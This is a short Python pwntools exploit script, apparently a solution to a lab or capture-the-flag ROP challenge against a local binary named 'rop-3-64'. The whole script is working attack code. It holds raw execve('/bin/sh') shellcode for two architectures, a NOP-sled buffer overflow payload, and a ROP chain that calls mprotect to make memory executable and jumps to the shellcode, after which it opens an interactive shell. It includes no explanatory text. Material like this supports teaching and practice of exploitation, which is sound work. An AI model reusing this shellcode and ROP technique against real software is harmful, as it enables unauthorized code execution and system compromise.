#!/usr/bin/env python

from pwn import *
import os

#SHELLCODE = 'j2X\xcd\x80PP[YjGX\xcd\x801\xc91\xd2j\x0bX\x99Rhn/shh//biT[\xcd\x80'
SHELLCODE = 'jlX\x0f\x05H\x89\xc6H\x89\xc7jrX\x0f\x05H1\xf6H1\xd2j;XH\xbb//bin/shVSH\x89\xe7\x0f\x05'

p = process("./rop-3-64")

mprotect = p64(0x0000000000400520)
pop_rdi = p64(0x0000000000400743)
pop_rsi_r15 = p64(0x0000000000400741)
pop_rdx = p64(0x000000000040064a)
ret = p64(0x00000000004004c6)

buf = "\x90"*10 + SHELLCODE + "\x90"*10
buf += "A" * (0x80 - len(SHELLCODE) - 20)
#buf = SHELLCODE
#buf += "A" * (0x80 - len(SHELLCODE))
buf += "BBBBBBBB"

buf += pop_rdi
buf += p64(0x601000)
buf += pop_rsi_r15
buf += p64(0x1000)
buf += p64(0)
#buf += "AAAAAAAA"
buf += pop_rdx
buf += p64(7)
buf += p64(0)
buf += mprotect
#buf += ret
buf += p64(0x601080)

with open("exploit.txt", "wb") as f:
        f.write(buf)

p.sendline(buf)
p.interactive()

